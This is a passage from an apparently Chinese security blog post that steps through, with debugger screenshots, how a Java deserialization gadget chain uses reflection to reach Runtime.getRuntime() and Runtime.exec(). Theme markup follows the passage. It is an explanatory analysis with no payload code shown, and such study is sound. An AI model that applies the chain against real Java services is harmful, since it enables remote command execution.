+<p>如果方法正常完成，则将其返回的值返回给调用invoke的调用者(也就是第一个参数obj)；如果该值具有基元类型，则首先将其适当地封装在一个对象中。但是，如果值的类型为基元类型的数组，则数组的元素不被包裹在对象中，换句话说，返回的是一个基元类型的数组。如果底层方法返回类型为void，则调用返回null。<br>额外补充一下：<br><strong>Method.invoke(obj, args)方法第一个参数是隐式参数(java核心技术卷一p216)</strong><br>隐式参数，譬如定义了一个类A，这个类有方法test(int t)<br>调用方法的时候一般都是 A x = new A();<br>x.test(2);<br>此处的x，我们称之为隐式参数，它代表了A这个类的一个实例，告诉了程序此处执行的test方法是谁的test方法。</p>
+<hr>
+<p>再次回到循环中<br><img src="https://i.loli.net/2021/03/24/gyzNCmd5O91Us3Q.png" alt="1.png"><br>注意到这里的object已经被更新为Method对象，他代表的方法是<code>java.lang.Runtime.getRuntime()</code>，这是一个静态方法<br>继续跟进下一个transform方法的调用<br><img src="https://i.loli.net/2021/03/25/XpRQvMTYfk5d8jP.png" alt="1.png"><br>这里理解起来稍微有些费劲，需要稍微动动脑筋。<br>首先method是一个Method对象，所以可以像method.invoke这样调用invoke方法<br>其次，method指向的底层方法是<code>java.lang.reflect.Method.invoke</code>方法<br>隐式参数input为Method对象，指向方法<code>java.lang.Runtime.getRuntime</code>方法<br>根据隐式方法调用，脱去第一层壳，由method.invoke(input,iArgs)变为<br>input.invoke(iArgs)<br>而刚才提到了，input是什么？是一个Method对象！那么input.invoke(iArgs)就相当于再次调用invoke方法。<br>由于input指向的<code>java.lang.Runtime.getRuntime</code>为静态方法，所以第一个参数可以为null。上面的图里iArgs在此刻第一个参数也确实为null。<br>那么input.invoke(iArgs)就相当于调用了一次<code>java.lang.Runtime.getRuntime</code>，最后返回的当然是一个Runtime类对象<br>于是乎，method.invoke(obj, args);返回一个Runtime对象也解释完成。再次回到循环中。<br><img src="https://i.loli.net/2021/03/25/w8NzRPrsW9mdOck.png" alt="1.png"><br>可以看到object已被更新为Runtime对象。</p>
+<p>进入最后一轮循环当中<br><img src="https://i.loli.net/2021/03/25/HuQfSki8laxCr6y.png" alt="1.png"><br>首先通过Class调用getMethod获取到指向<code>java.lang.Runtime.exec</code>方法的Method对象<br>随后通过method.invoke(input,iArgs)的方式，调用exec方法。这里的iArgs就是要执行的命令。<br>同样的，method.invoke(input,iArgs)可以看成是input.exec(iArgs)<br>而这里的input是一个Runtime对象，自然可以调用这个类的exec方法。<br>整个分析到此结束。</p>
+<h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><p>put(“value”,”value”);的更深入分析</p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://paper.seebug.org/312/" target="_blank" rel="noopener">https://paper.seebug.org/312/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/03/22/%E6%97%A5%E8%AF%AD%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="next" title="日语学习笔记">
+                <i class="fa fa-chevron-left"></i> 日语学习笔记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg"
+                alt="irrik" />
+            
+              <p class="site-author-name" itemprop="name">irrik</p>
+              <p class="site-description motion-element" itemprop="description">又菜又爱玩</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">27</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/irrik" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#执行流程分析"><span class="nav-number">2.</span> <span class="nav-text">执行流程分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse-Payload函数分析"><span class="nav-number">2.1.</span> <span class="nav-text">Reverse_Payload函数分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#动态调试"><span class="nav-number">3.</span> <span class="nav-text">动态调试</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#TODO"><span class="nav-number">4.</span> <span class="nav-text">TODO</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考资料"><span class="nav-number">5.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">irrik</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">115.6k</span>
+  
+</div>
+
+
+  <div class="powered-by">
+	<i class="fa fa-user-md"></i>
+	<span id="busuanzi_container_site_uv">
+		本站访客数:<span id="busuanzi_value_site_uv"></span>
+	</span>
+	<span class="post-meta-divider">|</span>
+	<span id="busuanzi_container_site_pv">
+		本站访问量<span id="busuanzi_value_site_pv"></span>
+	</span>
+</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
